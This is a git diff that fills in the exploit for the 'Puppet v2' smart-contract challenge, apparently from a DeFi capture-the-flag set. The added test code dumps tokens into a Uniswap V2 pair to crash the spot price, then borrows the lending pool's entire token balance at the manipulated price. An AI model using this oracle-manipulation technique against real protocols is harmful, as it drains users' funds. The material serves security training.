@@ -82,6 +82,48 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        // Approve the uniswap router to move your tokens
+        await this.token.connect(attacker).approve(
+          this.uniswapRouter.address,
+          ethers.utils.parseEther('100000000')
+        );
+
+        // Approve the lending pool to move your WETH
+        await this.weth.connect(attacker).approve(
+          this.lendingPool.address,
+          ethers.utils.parseEther('100000000')
+        );
+
+        // Swap all your tokens on the uniswap V2 pair. 
+        // Since the attacker balance is significantly more than what's int he uniswap pool,
+        // the price will crash a lot
+        await this.uniswapRouter.connect(attacker)
+          .swapExactTokensForTokens(ATTACKER_INITIAL_TOKEN_BALANCE, 
+                                    0, 
+                                    [this.token.address, this.weth.address],
+                                    attacker.address,
+                                    (await ethers.provider.getBlock('latest')).timestamp * 2);
+        
+        // Check the price of the lending pool
+        let price = await this.lendingPool.calculateDepositOfWETHRequired(ethers.utils.parseEther('1'))
+        console.log(`\tPrice: ${ethers.utils.formatEther(price)}`)
+        let ethNeededToDrainPool = price.mul(POOL_INITIAL_TOKEN_BALANCE).div(ethers.utils.parseEther('1'))
+        console.log(`\tETH Needed to drain pool: ${ethers.utils.formatEther(ethNeededToDrainPool)}`)
+
+        // Current WETH balance (due to the uniswap exchange)
+        let wethBalance = await this.weth.balanceOf(attacker.address);      
+        // Total attacker balance (ETH + WETH)    
+        let attackerBalance = await ethers.provider.getBalance(attacker.address);
+        console.log(`\tAttacker Bal : ${ethers.utils.formatEther(attackerBalance.add(wethBalance))}`);
+
+        // How much more WETH do we need +0.1 to avoid rounding / calculation errors
+        let wethNeeded = ethNeededToDrainPool.sub(wethBalance).add( ethers.utils.parseEther('0.1'));
+        await this.weth.connect(attacker).deposit({value: wethNeeded});
+
+        // Borrow all tokens in the pool due to the low price
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);
+
     });
 
     after(async function () {
